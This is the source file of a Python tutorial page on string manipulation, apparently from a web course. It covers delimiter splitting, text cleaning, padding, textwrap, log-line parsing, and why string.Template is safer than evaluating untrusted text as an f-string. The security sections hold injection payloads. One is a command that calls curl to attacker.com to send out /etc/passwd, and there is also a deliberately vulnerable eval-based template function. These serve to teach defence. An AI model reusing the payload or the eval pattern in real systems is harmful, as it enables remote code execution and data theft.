import type { Metadata } from 'next'
import { LearnLayout } from '@/components/content/LearnLayout'
import Link from 'next/link'
import { Callout } from '@/components/content/Callout'
import { KeyTakeaways } from '@/components/content/KeyTakeaways'

export const metadata: Metadata = {
  title: 'String Manipulation Deep Dive — Python | Chaduvuko',
  description:
    'Parsing messy real-world text, cleaning and normalising data, alignment and padding, textwrap, string.Template versus f-strings for untrusted input, and a full log-line parsing example.',
}

const C = '#7b61ff'

const SectionTag = ({ text }: { text: string }) => (
  <div style={{
    fontSize: 10, fontWeight: 700, letterSpacing: '.14em',
    textTransform: 'uppercase', color: 'var(--muted)',
    fontFamily: 'var(--font-mono)', marginBottom: 10,
  }}>{text}</div>
)

const SectionTitle = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{
    fontSize: 'clamp(20px, 2.5vw, 28px)', fontWeight: 900,
    letterSpacing: '-1px', color: 'var(--text)', marginBottom: 18,
    fontFamily: 'var(--font-display)', lineHeight: 1.2,
  }}>{children}</h2>
)

const SubTitle = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{
    fontSize: 'clamp(16px, 1.8vw, 20px)', fontWeight: 700,
    letterSpacing: '-0.3px', color: 'var(--text)', marginBottom: 12,
    fontFamily: 'var(--font-display)',
  }}>{children}</h3>
)

const SubSubTitle = ({ children }: { children: React.ReactNode }) => (
  <h4 style={{
    fontSize: 15, fontWeight: 700, color: 'var(--text)', marginBottom: 10,
  }}>{children}</h4>
)

const Para = ({ children }: { children: React.ReactNode }) => (
  <p style={{
    fontSize: 15, color: 'var(--text)', lineHeight: 1.9, marginBottom: 20,
  }}>{children}</p>
)

const CodeBox = ({ children, label }: { children: string; label?: string }) => (
  <div style={{ marginBottom: 24 }}>
    {label && (
      <div style={{
        fontSize: 11, fontWeight: 700, color: 'var(--muted)',
        letterSpacing: '.1em', textTransform: 'uppercase',
        marginBottom: 6, fontFamily: 'var(--font-mono)',
      }}>{label}</div>
    )}
    <pre style={{
      background: 'var(--bg2)', border: '1px solid var(--border)',
      borderRadius: 10, padding: '18px 22px', overflowX: 'auto',
      fontSize: 13, lineHeight: 1.9, color: 'var(--text)',
      fontFamily: 'var(--font-mono)', margin: 0, whiteSpace: 'pre-wrap',
    }}>
      <code>{children}</code>
    </pre>
  </div>
)

const Divider = () => (
  <div style={{ borderTop: '1px solid var(--border)', margin: '52px 0' }} />
)

export default function StringManipulationDeepDive() {
  return (
    <LearnLayout
      title="String Manipulation Deep Dive"
      description="Parsing messy real-world text, cleaning and normalising data, alignment and padding, textwrap, string.Template vs f-strings, and a full log-line parsing example."
      section="Python — Module 14"
      readTime="45 min"
      updatedAt="August 2026"
    >

      {/* ── Part 01 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 01 — Building On Module 04" />
        <SectionTitle>Beyond Indexing, Slicing, and f-strings</SectionTitle>

        <Para>
          Module 04 covered string fundamentals in depth — indexing, slicing, immutability, the core
          methods, Unicode, encoding, and f-strings. This module assumes all of that is solid ground and
          does not re-teach it. What it covers instead is the layer above the fundamentals: what you
          actually do with strings once real, messy data is involved — parsing text into structured
          pieces, cleaning up the inconsistencies that real-world text always has, formatting output for
          humans to read, and one genuinely important security distinction that only matters once your
          program starts handling text it did not write itself.
        </Para>

        <Para>
          If Module 04 was about the mechanics of a single string, this module is about strings as{' '}
          <strong>data</strong> — log lines, CSV-like text, user-submitted form fields, report output.
          This is also where Python string work starts to overlap meaningfully with the data-parsing
          skills used throughout data engineering, which is why nearly every example in this module
          uses text that looks like something a real production system would actually produce.
        </Para>
      </section>

      <Divider />

      {/* ── Part 02 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 02 — Parsing Structured Text" />
        <SectionTitle>Splitting on Multiple Delimiters, and a First Look at re.split</SectionTitle>

        <Para>
          Module 04&apos;s <code>.split()</code> handles the simple case well — splitting on a single,
          consistent delimiter. Real-world text is rarely that clean. A single line might use commas in
          some places and semicolons in others, or mix single and multiple spaces inconsistently.
        </Para>

        <CodeBox label="Where plain .split() falls short">{`line = "Denver, CO; 80202"

# .split(",") alone leaves the semicolon-separated part unsplit
parts = line.split(",")
print(parts)   # ['Denver', ' CO; 80202']`}</CodeBox>

        <Para>
          For a genuinely fixed, known set of delimiters, chaining <code>.replace()</code> calls to
          normalise everything to one delimiter before splitting is a perfectly reasonable, dependency-free
          approach.
        </Para>

        <CodeBox label="Normalising delimiters, then splitting once">{`line = "Denver, CO; 80202"
normalized = line.replace(";", ",")
parts = [p.strip() for p in normalized.split(",")]
print(parts)   # ['Denver', 'CO', '80202']`}</CodeBox>

        <Para>
          Once the set of possible delimiters grows, or the pattern is more than a fixed list of literal
          characters (say, splitting on any run of whitespace, or any combination of commas and
          semicolons), that is precisely the point where <code>re.split()</code> from the{' '}
          <code>re</code> module becomes the right tool — it splits on a <strong>pattern</strong> rather
          than a literal string.
        </Para>

        <CodeBox label="re.split() — a brief preview; full regex depth is Module 32">{`import re

line = "Denver, CO; 80202   99205"

# Split on a comma, semicolon, OR any run of whitespace, in one call
parts = re.split(r"[,;\\s]+", line)
parts = [p for p in parts if p]   # drop any empty strings left behind
print(parts)   # ['Denver', 'CO', '80202', '99205']`}</CodeBox>

        <Callout type="info">
          This module deliberately keeps regex light — just enough to recognise{' '}
          <code>re.split()</code> as an option when plain <code>.split()</code>/<code>.replace()</code>{' '}
          genuinely cannot express what you need. Full regular expression syntax — character classes,
          groups, quantifiers, and the rest of the <code>re</code> module — gets its own complete
          treatment in Module 32, later in this track.
        </Callout>
      </section>

      <Divider />

      {/* ── Part 03 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 03 — Cleaning Messy Text" />
        <SectionTitle>Whitespace, Control Characters, and Case Normalisation</SectionTitle>

        <Para>
          Text pulled from files, form submissions, or copy-pasted user input is reliably messier than
          text you type yourself. Leading/trailing whitespace, stray tab or newline characters buried
          mid-string, and inconsistent casing are the three most common sources of bugs that look like
          "the data doesn&apos;t match" when the actual problem is invisible formatting.
        </Para>

        <CodeBox label=".strip() handles more than spaces">{`raw = "  \\t Denver \\n"
print(repr(raw.strip()))
# 'Denver' — .strip() with no argument removes ALL leading/trailing whitespace:
# spaces, tabs (\\t), and newlines (\\n) — not just literal space characters.

# .strip() can also take an explicit set of characters to remove
messy = "***Denver***"
print(messy.strip("*"))   # "Denver"`}</CodeBox>

        <CodeBox label="A comparison bug caused entirely by invisible whitespace">{`user_input = "Denver "        # trailing space, easy to miss
if user_input == "Denver":
    print("Match")
else:
    print("No match")
# "No match" — the trailing space makes these two strings genuinely unequal

# The fix
if user_input.strip() == "Denver":
    print("Match")   # "Match"`}</CodeBox>

        <Para>
          Case is the second most common source of "matching" data that silently fails to match.{' '}
          <code>"Denver" != "denver"</code> — string comparison in Python is always case-sensitive.
          Whenever you are comparing user-facing text rather than an exact identifier, normalise the
          case on both sides first.
        </Para>

        <CodeBox label="Normalising case before comparing">{`cities = ["Denver", "Austin", "Portland"]
user_input = "DENVER"

if user_input.lower() in [c.lower() for c in cities]:
    print("Found a match")   # "Found a match"
else:
    print("Not found")`}</CodeBox>

        <Callout type="warning">
          <strong>.lower() is not always sufficient for text beyond plain English.</strong> As Module 04
          covered when discussing Unicode, some characters have case-folding behaviour that{' '}
          <code>.lower()</code> does not fully capture (the German <code>ß</code> is the textbook
          example). For case-insensitive comparison across a wide range of languages,{' '}
          <code>.casefold()</code> is the more thorough option — it behaves like <code>.lower()</code>{' '}
          for plain English but handles these edge cases correctly.
        </Callout>

        <SubTitle>Removing genuinely non-printable characters</SubTitle>

        <Para>
          Occasionally text arrives with actual control characters embedded in it — leftover artifacts
          from a scraped PDF, a malformed export, or a copy-paste from a terminal. These are invisible
          when printed but can break downstream parsing or storage.
        </Para>

        <CodeBox label="Stripping non-printable characters">{`raw = "Denver\\x00\\x07 CO"   # contains a null byte and a bell character

cleaned = "".join(ch for ch in raw if ch.isprintable() or ch == " ")
print(cleaned)   # "Denver CO"`}</CodeBox>
      </section>

      <Divider />

      {/* ── Part 04 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 04 — Alignment and Padding" />
        <SectionTitle>.ljust(), .rjust(), .center(), .zfill() — Fixed-Width Output</SectionTitle>

        <Para>
          When you need output to line up visually — a plain-text report, a fixed-width export file, a
          console table — you need every field padded to a consistent width. These four methods exist
          specifically for that, and they come up constantly any time output needs to look tidy without
          pulling in a formatting library.
        </Para>

        <CodeBox label="ljust, rjust, center — padding to a fixed width">{`print("Denver".ljust(12) + "|")     # "Denver      |"  — left-aligned, padded with spaces on the right
print("Denver".rjust(12) + "|")     # "      Denver|"  — right-aligned, padded with spaces on the left
print("Denver".center(12) + "|")    # "   Denver   |"  — centered, padded on both sides

# All three accept a custom fill character as a second argument
print("Denver".ljust(12, ".") + "|")   # "Denver......|"`}</CodeBox>

        <CodeBox label="A real use case — a fixed-width text report">{`rows = [
    ("Priya Nair", "Engineering", 118000),
    ("Wei Zhang", "Engineering", 121000),
    ("Alex Torres", "Sales", 95000),
]

for name, dept, salary in rows:
    print(name.ljust(15) + dept.ljust(14) + str(salary).rjust(8))

# Priya Nair     Engineering     118000
# Wei Zhang      Engineering     121000
# Alex Torres    Sales            95000
# Notice salary is right-justified — numbers conventionally align on the right
# so that the ones/tens/hundreds columns line up vertically, exactly like a spreadsheet.`}</CodeBox>

        <CodeBox label=".zfill() — zero-padding for numeric-looking strings">{`invoice_number = "42"
print(invoice_number.zfill(6))   # "000042"

# Genuinely common for IDs, invoice numbers, and codes that must always be a fixed width
order_id = f"ORD-{str(7).zfill(5)}"
print(order_id)   # "ORD-00007"`}</CodeBox>

        <Callout type="tip">
          For anything beyond simple fixed-width padding — controlling decimal places, thousands
          separators, or percentage formatting — f-string format specifiers (covered in Module 04 and
          Module 10) are usually the better tool: <code>f&quot;{`{salary:>10,}`}&quot;</code> right-aligns
          a number to width 10 <em>and</em> adds thousands separators in one step, something{' '}
          <code>.rjust()</code> alone cannot do.
        </Callout>
      </section>

      <Divider />

      {/* ── Part 05 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 05 — The textwrap Module" />
        <SectionTitle>Wrapping Long Text to a Fixed Width</SectionTitle>

        <Para>
          The standard library&apos;s <code>textwrap</code> module handles a genuinely fiddly problem
          correctly: taking a long, unbroken string and wrapping it to a maximum line width, breaking
          only at word boundaries rather than mid-word — something that is surprisingly easy to get
          wrong if you try to write it yourself with plain slicing.
        </Para>

        <CodeBox label="textwrap.wrap() and textwrap.fill()">{`import textwrap

message = "The nightly reconciliation job failed because three transactions could not be matched against the payment processor's records."

wrapped_lines = textwrap.wrap(message, width=40)
for line in wrapped_lines:
    print(line)
# The nightly reconciliation job failed
# because three transactions could not be
# matched against the payment processor's
# records.

# textwrap.fill() does the same wrapping, but returns one single string
# with newlines already inserted, ready to print directly
print(textwrap.fill(message, width=40))`}</CodeBox>

        <CodeBox label="textwrap.shorten() — truncate with an ellipsis, cleanly at a word boundary">{`print(textwrap.shorten(message, width=50, placeholder="..."))
# "The nightly reconciliation job failed..."
# Note it truncates at a whole word, not mid-word — unlike message[:50]`}</CodeBox>

        <Para>
          This comes up constantly in real code that generates human-facing output — CLI tools printing
          help text or error messages to a terminal of unknown width, email or notification bodies that
          need to stay readable, or log summaries that must not blow past a fixed column limit.
        </Para>
      </section>

      <Divider />

      {/* ── Part 06 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 06 — Templates and Untrusted Input" />
        <SectionTitle>string.Template vs f-strings — A Real Security Distinction</SectionTitle>

        <Para>
          F-strings are the right tool for the vast majority of string formatting in Python — but they
          have a property that is easy to forget matters: an f-string <strong>evaluates arbitrary
          Python expressions</strong> at the point it is written in your source code. That is completely
          safe when you write the template yourself. It stops being safe the instant the template text
          itself comes from somewhere you do not fully control.
        </Para>

        <CodeBox label="Why an f-string cannot safely come from untrusted input">{`# NEVER do this — building an f-string dynamically from user-supplied text
user_supplied_template = "Hello {name}, your balance is {__import__('os').system('echo pwned')}"

# If this string were ever passed to eval() or exec() to be "evaluated as an f-string",
# it would execute the __import__('os').system(...) call — arbitrary code execution.
# f-strings are only safe because YOU wrote them as literal source code —
# the moment the template text itself is untrusted, this danger becomes real.`}</CodeBox>

        <Para>
          In practice, nobody dynamically <code>eval()</code>s a string as an f-string — but the
          underlying risk is real whenever your program lets an end user, a config file, or an external
          system define a message <strong>template</strong> that your code later fills in with values.
          For exactly this situation, the standard library provides <code>string.Template</code>, which
          supports simple <code>$placeholder</code> substitution and nothing else — no expression
          evaluation, no function calls, no attribute access. It cannot execute code, by design.
        </Para>

        <CodeBox label="string.Template — safe substitution, no expression evaluation">{`from string import Template

# Imagine this template text came from a user-editable notification setting,
# stored in a database, not written by you in source code
user_template = Template("Hello $name, your order $order_id has shipped.")

message = user_template.substitute(name="Maria Gomez", order_id="ORD-1001")
print(message)
# "Hello Maria Gomez, your order ORD-1001 has shipped."

# Attempting to smuggle in an expression does nothing dangerous —
# it's just treated as literal, unrecognised text
sneaky_template = Template("Hello $name, here is a secret: \${__import__('os').system('ls')}")
# This raises a ValueError on unrecognized placeholder syntax, or substitutes
# it as plain text if it doesn't match Template's simple $identifier syntax —
# it never evaluates it as executable Python, unlike an f-string would.`}</CodeBox>

        <Callout type="warning">
          <strong>The rule to internalise:</strong> if <em>you</em> are writing the template as literal
          source code and only the <em>values</em> being substituted in are untrusted (a user&apos;s
          name, an order ID), f-strings are completely safe — the values are just data, never
          re-interpreted as code. The risk only appears when the <strong>template text itself</strong>{' '}
          is not something you wrote — for example, a customizable email template stored in a database
          and editable by end users. In that specific case, use <code>string.Template</code>, not an
          f-string built dynamically from that text.
        </Callout>
      </section>

      <Divider />

      {/* ── Part 07 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 07 — Worked Example" />
        <SectionTitle>Parsing a Messy Real-World Log Line</SectionTitle>

        <Para>
          This example ties together nearly every technique from this module against one realistic
          target: a raw log line from a web server, in the kind of loosely-structured format real
          logging systems actually produce.
        </Para>

        <CodeBox label="The raw input">{`log_line = "  2026-08-14T09:14:02Z   [ERROR]  api-gateway  ;  user_id=4821 ; message = Payment failed: card DECLINED  \\n"`}</CodeBox>

        <Para>
          This single line has almost every real-world text problem this module has covered: leading
          and trailing whitespace, inconsistent spacing around delimiters, a mix of semicolons and
          key=value pairs, and a trailing newline. Parsing it into structured data means combining
          cleaning, splitting, and normalisation in sequence.
        </Para>

        <CodeBox label="Step 1 — strip the outer whitespace and newline">{`line = log_line.strip()
print(repr(line))
# '2026-08-14T09:14:02Z   [ERROR]  api-gateway  ;  user_id=4821 ; message = Payment failed: card DECLINED'`}</CodeBox>

        <CodeBox label="Step 2 — split the timestamp, level, and service off the front">{`import re

# The first three fields are separated by runs of whitespace, not a single delimiter
header, rest = re.split(r"\\s{2,}", line, maxsplit=1)[0], re.split(r"\\s{2,}", line, maxsplit=1)[1]

# Actually cleaner: split the whole line on 2+ spaces first, since that's the consistent boundary
fields = re.split(r"\\s{2,}", line)
timestamp, level, service, remainder = fields[0], fields[1], fields[2], fields[3]

level = level.strip("[]")   # "[ERROR]" -> "ERROR"
print(timestamp, level, service)
# 2026-08-14T09:14:02Z ERROR api-gateway`}</CodeBox>

        <CodeBox label="Step 3 — split the semicolon-delimited key=value section">{`# remainder is: " ;  user_id=4821 ; message = Payment failed: card DECLINED"
parts = [p.strip() for p in remainder.split(";") if p.strip()]
print(parts)
# ['user_id=4821', 'message = Payment failed: card DECLINED']`}</CodeBox>

        <CodeBox label="Step 4 — split each part into key/value, cleaning whitespace around =">{`parsed = {}
for part in parts:
    key, _, value = part.partition("=")
    parsed[key.strip()] = value.strip()

print(parsed)
# {'user_id': '4821', 'message': 'Payment failed: card DECLINED'}`}</CodeBox>

        <Para>
          <code>.partition("=")</code> is worth calling out — it splits on the <em>first</em> occurrence
          only, returning a 3-tuple of (before, separator, after). This matters here because the message
          value itself contains a colon (<code>&quot;Payment failed: card DECLINED&quot;</code>) that
          must be preserved as-is, not accidentally split on. Had this used <code>.split(&quot;=&quot;)</code>{' '}
          instead and a value happened to contain an <code>=</code> character too, it would have split
          in the wrong place — <code>.partition()</code> avoids that entirely by only ever splitting
          once.
        </Para>

        <CodeBox label="Putting it together — one function, the full parse">{`def parse_log_line(raw_line):
    line = raw_line.strip()
    fields = re.split(r"\\s{2,}", line)
    timestamp, level, service, remainder = fields[0], fields[1].strip("[]"), fields[2], fields[3]

    parsed = {"timestamp": timestamp, "level": level, "service": service}
    for part in remainder.split(";"):
        part = part.strip()
        if not part:
            continue
        key, _, value = part.partition("=")
        parsed[key.strip()] = value.strip()

    return parsed

result = parse_log_line(log_line)
print(result)
# {'timestamp': '2026-08-14T09:14:02Z', 'level': 'ERROR', 'service': 'api-gateway',
#  'user_id': '4821', 'message': 'Payment failed: card DECLINED'}`}</CodeBox>

        <Para>
          The result is exactly the flat-dict-per-record shape from Module 13 — this{' '}
          <code>parse_log_line()</code> function is precisely the "normalize once, at the boundary"
          pattern from that module&apos;s Part 07, applied to text instead of nested JSON. Every other
          function that processes logs downstream can now work with clean dicts and never touch a raw
          log string again.
        </Para>
      </section>

      <Divider />

      {/* ── Part 08 — Real World ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="story">
        <SectionTag text="// Part 08 — Real World" />
        <div style={{
          fontSize: 10, fontWeight: 700, letterSpacing: '.12em',
          textTransform: 'uppercase', color: 'var(--muted)', marginBottom: 12,
          fontFamily: 'var(--font-mono)',
        }}>
          💼 What This Looks Like at Work
        </div>
        <SectionTitle>An Atlanta Healthtech&apos;s Notification Template Incident</SectionTitle>

        <div style={{
          background: 'var(--surface)', border: '1px solid var(--border)',
          borderRadius: 12, padding: '24px 28px', marginBottom: 24,
        }}>
          <div style={{
            fontSize: 11, fontWeight: 700, color: 'var(--accent)',
            background: 'rgba(123,97,255,0.1)', border: '1px solid rgba(123,97,255,0.2)',
            borderRadius: 6, padding: '4px 10px', fontFamily: 'var(--font-mono)',
            display: 'inline-block', marginBottom: 20, letterSpacing: '.1em',
            textTransform: 'uppercase',
          }}>
            Scenario — Healthtech company, Atlanta · Security review finding
          </div>

          <Para>
            An Atlanta healthtech company lets clinic administrators customize the wording of automated
            appointment-reminder text messages through a settings page — administrators type something
            like <code>&quot;Hi {`{patient_name}`}, your appointment is on {`{appointment_date}`}.&quot;</code>{' '}
            and the backend fills in the real values before sending.
          </Para>

          <CodeBox label="The original implementation — flagged in a security review">{`def build_reminder(template_text, patient_name, appointment_date):
    return eval(f"f'{template_text}'")
    # The administrator's saved template_text gets evaluated as a live f-string,
    # meaning ANY Python expression inside it would actually execute.`}</CodeBox>

          <SubSubTitle>What the security review finds</SubSubTitle>

          <Para>
            This is exactly the danger described in Part 06: <code>template_text</code> is not written
            by the engineering team as literal source code — it is saved by clinic administrators
            through a settings page, and a subset of clinic staff accounts have been shared or reused
            loosely enough that the reviewer treats this as a genuinely exploitable input, not a
            theoretical risk. A malicious or compromised administrator account could save a template
            like <code>&quot;{`{__import__('os').system('curl attacker.com/steal?data=' + open('/etc/passwd').read())}`}&quot;</code>{' '}
            and have it silently execute on the server the next time any reminder used that template —
            full arbitrary code execution, from a text field that was only ever supposed to hold a
            polite message.
          </Para>

          <SubSubTitle>The fix</SubSubTitle>

          <Para>
            The team replaces the <code>eval()</code>-based f-string trick with{' '}
            <code>string.Template</code>, exactly as covered in Part 06 — administrators now write{' '}
            <code>$patient_name</code> and <code>$appointment_date</code> instead of curly braces, and
            the substitution can never evaluate anything beyond simple placeholder replacement.
          </Para>

          <CodeBox label="The fix — string.Template, incapable of executing code">{`from string import Template

def build_reminder(template_text, patient_name, appointment_date):
    template = Template(template_text)
    return template.safe_substitute(
        patient_name=patient_name,
        appointment_date=appointment_date,
    )

# Administrators now write templates using $patient_name and $appointment_date.
# safe_substitute(), unlike substitute(), leaves any unrecognized $placeholder
# untouched in the output instead of raising — a good fit for user-authored templates
# where a typo shouldn't crash the whole notification.`}</CodeBox>

          <Para>
            The broader lesson the team documents for future reviews: any time text that came from{' '}
            <em>outside the codebase</em> — a database field, a form submission, a config value a
            non-engineer can edit — is treated as a format string or a template, it needs the same
            scrutiny given here. F-strings, <code>.format()</code>, and especially <code>eval()</code>{' '}
            are for templates <em>you</em> write. <code>string.Template</code> is for templates{' '}
            <em>someone else</em> writes.
          </Para>
        </div>
      </section>

      <Divider />

      {/* ── Part 09 — Misconceptions ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="myth">
        <SectionTag text="// Part 09 — Misconceptions" />
        <SectionTitle>Four Misconceptions About String Manipulation</SectionTitle>

        {[
          {
            wrong: '".strip() only removes literal space characters"',
            right: '.strip() with no argument removes every kind of leading/trailing whitespace — spaces, tabs, and newlines alike. It only becomes literal-character removal when you explicitly pass a string of characters to strip, e.g. .strip("*"), in which case it strips any combination of exactly those characters from both ends.',
          },
          {
            wrong: '"f-strings are always completely safe, no matter where the template text comes from"',
            right: 'F-strings are safe when you write them as literal source code — the expressions inside {} are fixed by you at write time. They stop being safe the moment the template text itself is dynamic and comes from an untrusted source (a database field, user input) and gets evaluated as an f-string, since f-strings can execute arbitrary expressions. That specific situation calls for string.Template instead.',
          },
          {
            wrong: '".split("=") is always safe for parsing key=value text"',
            right: 'split("=") splits on every occurrence of "=" in the string, which breaks if the value itself legitimately contains an "=" character. .partition("=") splits only on the first occurrence, returning a clean (key, separator, value) 3-tuple regardless of how many "=" characters appear afterward in the value — the safer default for this exact parsing task.',
          },
          {
            wrong: '"Wrapping long text to a fixed width is just slicing it every N characters"',
            right: 'Naive slicing (text[:40], text[40:80], ...) breaks words in the middle wherever a line boundary happens to fall mid-word. textwrap.wrap() and textwrap.fill() specifically break only at word boundaries, which is the behaviour anyone reading the wrapped text actually expects.',
          },
        ].map((item, i) => (
          <div key={i} style={{
            background: 'var(--surface)', border: '1px solid var(--border)',
            borderRadius: 10, padding: '20px 24px', marginBottom: 16,
          }}>
            <div style={{
              fontSize: 13, fontWeight: 700, color: 'var(--red)',
              marginBottom: 8, fontFamily: 'var(--font-mono)',
            }}>
              ✕ &quot;{item.wrong}&quot;
            </div>
            <div style={{ fontSize: 14, color: 'var(--muted)', lineHeight: 1.7 }}>
              {item.right}
            </div>
          </div>
        ))}
      </section>

      <Divider />

      {/* ── Part 10 — Interview Prep ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="prep">
        <SectionTag text="// Part 10 — Interview Prep" />
        <SectionTitle>5 Interview Questions — With Complete Answers</SectionTitle>

        {[
          {
            q: 'When would you reach for re.split() instead of str.split()?',
            a: 'str.split() only splits on a single, fixed literal string (or on any whitespace, with no argument). re.split() splits on a regular expression pattern, which is necessary when the delimiter is not a single fixed string — for example, splitting on any combination of commas, semicolons, and repeated whitespace in one call, using a character-class pattern like [,;\\s]+.',
          },
          {
            q: 'What is the security concern with building an f-string dynamically from external input, and what is the safer alternative?',
            a: 'An f-string evaluates arbitrary Python expressions at the point it is defined — safe when you write the template as literal source code, since the expressions are fixed. If the TEMPLATE TEXT ITSELF comes from an untrusted source (a database field a user can edit, for example) and is evaluated as an f-string, an attacker can embed arbitrary expressions, including code execution. string.Template is the safe alternative — it supports only simple $placeholder substitution and cannot evaluate expressions, function calls, or attribute access.',
          },
          {
            q: 'What is the difference between str.split("=") and str.partition("=") when parsing key=value text?',
            a: '.split("=") splits on every occurrence of "=" in the string, producing more than two pieces if the value itself contains an "=" character — which silently breaks naive key, value = line.split("=") unpacking. .partition("=") splits only on the FIRST occurrence and always returns exactly a 3-tuple (before, separator, after), making it the safer choice when the value portion might legitimately contain the delimiter character.',
          },
          {
            q: 'What is the difference between .strip(), .lower(), and .casefold() when preparing two strings for comparison?',
            a: '.strip() removes leading/trailing whitespace, which fixes comparisons broken by accidental padding. .lower() and .casefold() both normalize case, but .casefold() is more aggressive and correctly handles certain Unicode case-folding edge cases (like the German ß) that .lower() does not. For robust case-insensitive comparison across arbitrary text, .casefold() is the more correct choice; for plain ASCII text, they behave identically.',
          },
          {
            q: 'How would you pad a numeric ID to a fixed width with leading zeros, and how is that different from .rjust()?',
            a: '.zfill(width) pads a string with leading zeros to reach the target width, and specifically handles a leading sign character correctly (e.g. "-5".zfill(3) gives "-05", not "0-5"). .rjust(width) pads with spaces (or a specified fill character) and has no special handling for a leading sign — .zfill() is purpose-built for numeric-looking strings like IDs, invoice numbers, and zip codes, while .rjust() is the general-purpose alignment tool.',
          },
        ].map((item, i) => (
          <div key={i} style={{
            background: 'var(--surface)', border: '1px solid var(--border)',
            borderRadius: 12, padding: '24px 28px', marginBottom: 20,
          }}>
            <div style={{
              fontSize: 14, fontWeight: 800, color: 'var(--text)',
              marginBottom: 14, lineHeight: 1.4,
            }}>
              {item.q}
            </div>
            <div style={{ fontSize: 14, color: 'var(--muted)', lineHeight: 1.85 }}>
              {item.a}
            </div>
          </div>
        ))}
      </section>

      <Divider />

      {/* ── Common Mistakes ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="plain">
        <SectionTag text="// Common Mistakes" />
        <SectionTitle>String Manipulation Mistakes Beginners Make Constantly</SectionTitle>

        {[
          {
            q: 'Comparing strings without stripping or normalising case first',
            a: 'user_input == "Denver" silently fails if user_input has trailing whitespace or different casing, even though the text "looks" identical when printed. Strip and normalise case on both sides before any comparison involving human-entered text.',
          },
          {
            q: 'Using .split("=") to parse a single key=value pair when the value might contain "="',
            a: 'key, value = line.split("=") raises ValueError: too many values to unpack the moment the value legitimately contains another "=" character. Use .partition("=") instead, which always returns exactly three parts regardless of how many "=" characters appear in the remainder.',
          },
          {
            q: 'Slicing text to a fixed length instead of using textwrap',
            a: 'text[:40] to "shorten" a string can cut a word in half mid-character, producing output that looks broken to a reader. textwrap.shorten() truncates cleanly at a word boundary and adds a placeholder like "..." automatically.',
          },
          {
            q: 'Evaluating externally-sourced text as a template with eval() or exec()',
            a: 'As shown in the Real World example, this creates a genuine code-execution vulnerability the moment the template text is not fully trusted. Use string.Template for any template whose text originates outside your own source code.',
          },
          {
            q: 'Assuming .lower() is always sufficient for case-insensitive matching',
            a: 'For plain English text it usually is. For text that may include other languages or certain special characters, .casefold() is the more correct and more thorough choice for comparison purposes.',
          },
        ].map((item, i) => (
          <div key={i} style={{
            background: 'var(--surface)', border: '1px solid var(--border)',
            borderRadius: 12, padding: '24px 28px', marginBottom: 20,
          }}>
            <div style={{
              fontSize: 14, fontWeight: 800, color: 'var(--text)',
              marginBottom: 14, lineHeight: 1.4,
            }}>
              {item.q}
            </div>
            <div style={{ fontSize: 14, color: 'var(--muted)', lineHeight: 1.85 }}>
              {item.a}
            </div>
          </div>
        ))}
      </section>

      <Divider />

      {/* ── Error Library ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="plain">
        <SectionTag text="// Error Library" />
        <SectionTitle>Errors You Will Hit With String Parsing — And Exactly Why</SectionTitle>

        {[
          {
            error: `ValueError: too many values to unpack (expected 2)`,
            cause: 'Using key, value = text.split("=") on text where the value portion contains more than one "=" character, producing more than two pieces from split().',
            fix: 'Use .partition("=") instead of .split("="), which always returns exactly a 3-tuple (key, separator, value) by splitting only on the first occurrence.',
          },
          {
            error: `KeyError: 'placeholder_name' (from string.Template.substitute)`,
            cause: 'Calling .substitute() with a template that references a $placeholder for which no matching keyword argument was supplied.',
            fix: 'Either supply every placeholder the template references, or use .safe_substitute() instead of .substitute() — it leaves unmatched placeholders in the output as literal text instead of raising.',
          },
          {
            error: `ValueError: Invalid placeholder in string: line 1, column 12`,
            cause: 'A string.Template contains a "$" character that is not part of valid $identifier or ${identifier} placeholder syntax — commonly a literal dollar sign meant as currency, like "$50".',
            fix: 'Escape a literal dollar sign by doubling it: "Price: $$50" — Template treats "$$" as a literal single "$" in the output.',
          },
          {
            error: `AttributeError: 'NoneType' object has no attribute 'group' (from a regex match)`,
            cause: 'Calling .group() directly on the result of re.search() or re.match() when the pattern did not actually match anything, since both return None on no match rather than raising.',
            fix: 'Always check the match object before calling methods on it: match = re.search(pattern, text); if match: match.group(). This becomes second nature once Module 32 covers regex in full.',
          },
          {
            error: `IndexError: list index out of range (after re.split or str.split)`,
            cause: 'Assuming a split operation always produces a fixed number of pieces, then indexing into a position that does not exist for a particular line that had fewer delimiters than expected.',
            fix: 'Check len(parts) before indexing into a fixed set of positions, or use unpacking with a default fallback, especially when parsing real-world text where not every line is guaranteed to have the same shape.',
          },
        ].map((item, i) => (
          <div key={i} style={{
            background: 'var(--bg2)', border: '1px solid var(--border)',
            borderRadius: 10, padding: '20px 24px', marginBottom: 16,
          }}>
            <div style={{
              fontFamily: 'var(--font-mono)', fontSize: 12,
              color: 'var(--red)', marginBottom: 12,
              background: 'rgba(255,71,87,0.08)', border: '1px solid rgba(255,71,87,0.2)',
              borderRadius: 6, padding: '8px 12px',
              lineHeight: 1.5,
            }}>
              {item.error}
            </div>
            <div style={{ marginBottom: 8 }}>
              <span style={{
                fontSize: 10, fontWeight: 700, color: 'var(--muted)',
                fontFamily: 'var(--font-mono)', letterSpacing: '.1em',
                textTransform: 'uppercase',
              }}>Cause: </span>
              <span style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.7 }}>{item.cause}</span>
            </div>
            <div>
              <span style={{
                fontSize: 10, fontWeight: 700, color: 'var(--accent)',
                fontFamily: 'var(--font-mono)', letterSpacing: '.1em',
                textTransform: 'uppercase',
              }}>Fix: </span>
              <span style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.7 }}>{item.fix}</span>
            </div>
          </div>
        ))}
      </section>

      {/* ── Key Takeaways ── */}
      <KeyTakeaways items={[
        'For delimiters beyond a single fixed string, re.split() splits on a pattern — a light preview of the regex module covered fully in Module 32.',
